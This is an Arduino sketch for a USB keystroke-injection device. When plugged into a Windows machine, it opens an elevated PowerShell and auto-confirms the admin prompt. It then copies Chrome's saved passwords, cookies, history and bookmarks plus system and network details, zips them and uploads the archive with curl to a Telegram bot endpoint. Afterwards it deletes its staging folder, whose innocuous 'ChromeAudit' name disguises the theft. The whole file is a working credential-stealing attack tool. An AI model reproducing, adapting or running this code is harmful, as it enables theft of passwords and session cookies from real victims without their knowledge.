#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(8000);
}

void loop() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(2000);
  
  Keyboard.print("powershell Start-Process powershell -Verb RunAs");
  Keyboard.write(KEY_RETURN);
  delay(7000);
  
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(5000);

  const char* commands[] = {
    "mkdir C:\\ChromeAudit",
    "cd C:\\ChromeAudit",
    
    // CHROME DATA EXTRACTION (UPDATED)
    "Copy-Item \"$env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\" .\\Chrome_History -Force",
    "Copy-Item \"$env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" .\\Chrome_Passwords -Force",
    "Copy-Item \"$env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks\" .\\Chrome_Bookmarks -Force",
    "Copy-Item \"$env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Preferences\" .\\Chrome_Preferences -Force",
    
    // NEW COOKIES LOCATION (Chrome 80+)
    "Copy-Item \"$env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\" .\\Chrome_Cookies -Force",
    
    // ALTERNATIVE COOKIES SEARCH
    "Get-ChildItem \"$env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\" -Recurse -Include 'Cookie' | Copy-Item -Destination . -Force",
    
    // LIST ALL COPIED FILES
    "echo 'COPIED FILES:' > file_list.txt",
    "Get-ChildItem | Format-Table Name, Length >> file_list.txt",
    
    "systeminfo > System_Info.txt",
    "ipconfig /all > Network_Info.txt",
    "Compress-Archive -Path * -DestinationPath Chrome_Audit.zip -Force",
    "curl.exe -F document=@Chrome_Audit.zip \"https://api.telegram.org/bot8469309529:AAH1kdLYjtwee39EAgULMJa64Db_xRnWpYw/sendDocument?chat_id=1361241039\"",
    "cd C:\\; Remove-Item -Path C:\\ChromeAudit -Recurse -Force",
    "exit"
  };

  for(int i = 0; i < 18; i++) {
    Keyboard.print(commands[i]);
    Keyboard.write(KEY_RETURN);
    delay(4000);
  }

  while(1);
}
